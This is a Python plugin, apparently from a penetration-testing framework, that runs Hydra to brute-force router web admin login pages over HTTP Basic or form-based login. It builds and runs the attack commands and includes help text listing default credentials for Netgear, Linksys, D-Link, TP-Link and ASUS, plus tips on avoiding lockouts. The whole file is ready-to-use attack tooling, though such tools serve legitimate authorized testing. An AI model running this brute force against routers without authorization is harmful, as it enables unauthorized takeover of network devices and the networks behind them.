#!/usr/bin/env python3
"""
souleyez.plugins.router_http_brute

Router web admin brute force plugin using Hydra.
Targets common router login pages with default credentials.
"""

import subprocess
import time
from typing import List

from souleyez.security.validation import ValidationError, validate_target

from .plugin_base import PluginBase

HELP = {
    "name": "Router HTTP Brute — Web Admin Login Attack",
    "description": (
        "Brute force router web admin login pages.\n\n"
        "Many routers have web-based admin interfaces with:\n"
        "- HTTP Basic Authentication\n"
        "- Form-based login pages\n"
        "- Default/weak credentials\n\n"
        "This plugin uses Hydra to test common router credentials.\n\n"
        "Quick tips:\n"
        "- Common default users: admin, root, user, Administrator\n"
        "- Common default passwords: admin, password, 1234, (blank)\n"
        "- Use low thread count to avoid lockouts\n"
        "- Check for login page first (may be at /login, /admin, etc.)\n"
    ),
    "usage": "souleyez jobs enqueue router_http_brute <target>",
    "examples": [
        "souleyez jobs enqueue router_http_brute 192.168.1.1",
        'souleyez jobs enqueue router_http_brute 192.168.1.1 --args "--port 8080"',
        'souleyez jobs enqueue router_http_brute 192.168.1.1 --args "--basic"',
    ],
    "flags": [
        ["--port PORT", "Target port (default: 80)"],
        ["--basic", "Use HTTP Basic Auth (default)"],
        ["--form PATH", "Use form-based login at PATH"],
        ["--ssl", "Use HTTPS"],
    ],
    "presets": [
        {
            "name": "Basic Auth",
            "args": ["--basic"],
            "desc": "HTTP Basic Authentication",
        },
        {
            "name": "HTTPS Basic",
            "args": ["--basic", "--ssl"],
            "desc": "HTTPS Basic Auth",
        },
        {
            "name": "Port 8080",
            "args": ["--port", "8080"],
            "desc": "Alternate port 8080",
        },
    ],
    "help_sections": [
        {
            "title": "Common Router Defaults",
            "color": "cyan",
            "content": [
                {"title": "Netgear", "desc": "admin / password"},
                {"title": "Linksys", "desc": "admin / admin"},
                {"title": "D-Link", "desc": "admin / (blank) or admin"},
                {"title": "TP-Link", "desc": "admin / admin"},
                {"title": "ASUS", "desc": "admin / admin"},
            ],
        }
    ],
}


class RouterHTTPBrutePlugin(PluginBase):
    name = "Router HTTP Brute"
    tool = "hydra"
    category = "exploitation"
    HELP = HELP

    def _get_wordlist_path(self, filename: str) -> str:
        """Get path to wordlist file."""
        from souleyez.wordlists import resolve_wordlist_path

        return resolve_wordlist_path(f"data/wordlists/{filename}")

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build Hydra command for router HTTP brute force."""
        args = args or []

        # Validate target
        try:
            target = validate_target(target)
        except ValidationError as e:
            if log_path:
                with open(log_path, "w") as f:
                    f.write(f"ERROR: Invalid target: {e}\n")
            return None

        # Parse arguments
        port = "80"
        use_ssl = False
        use_form = False
        form_path = "/login"

        i = 0
        while i < len(args):
            if args[i] == "--port" and i + 1 < len(args):
                port = args[i + 1]
                i += 2
            elif args[i] == "--ssl":
                use_ssl = True
                port = "443" if port == "80" else port
                i += 1
            elif args[i] == "--form" and i + 1 < len(args):
                use_form = True
                form_path = args[i + 1]
                i += 2
            elif args[i] == "--basic":
                use_form = False
                i += 1
            else:
                i += 1

        # Common router credentials
        users = self._get_wordlist_path("router_users.txt")
        passwords = self._get_wordlist_path("router_passwords.txt")

        # Build Hydra command
        if use_form:
            service = "https-post-form" if use_ssl else "http-post-form"
            # Generic form attack - adjust for specific routers
            form_string = f"{form_path}:username=^USER^&password=^PASS^:F=incorrect"
            cmd = [
                "hydra",
                "-L",
                users,
                "-P",
                passwords,
                "-s",
                port,
                "-t",
                "2",  # Low threads
                "-w",
                "3",  # Wait 3 seconds between attempts
                "-vV",
                target,
                service,
                form_string,
            ]
        else:
            service = "https-get" if use_ssl else "http-get"
            cmd = [
                "hydra",
                "-L",
                users,
                "-P",
                passwords,
                "-s",
                port,
                "-t",
                "2",
                "-w",
                "3",
                "-vV",
                "-f",  # Stop on first success
                target,
                service,
                "/",
            ]

        return {"cmd": cmd, "timeout": 1800}  # 30 minute timeout

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute router HTTP brute force."""
        cmd_spec = self.build_command(target, args, label, log_path)
        if cmd_spec is None:
            return 1

        cmd = cmd_spec["cmd"]

        if log_path:
            with open(log_path, "w") as f:
                f.write(f"# Router HTTP Brute Force on {target}\n")
                f.write(f"# Command: {' '.join(cmd)}\n")
                f.write(f"# Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        try:
            with open(log_path, "a") as f:
                result = subprocess.run(
                    cmd, stdout=f, stderr=subprocess.STDOUT, timeout=cmd_spec["timeout"]
                )
            return result.returncode

        except subprocess.TimeoutExpired:
            if log_path:
                with open(log_path, "a") as f:
                    f.write("\n\n# ERROR: Brute force timed out\n")
            return 124
        except FileNotFoundError:
            if log_path:
                with open(log_path, "a") as f:
                    f.write("\n\n# ERROR: Hydra not found\n")
            return 127
        except Exception as e:
            if log_path:
                with open(log_path, "a") as f:
                    f.write(f"\n\n# ERROR: {e}\n")
            return 1


plugin = RouterHTTPBrutePlugin()
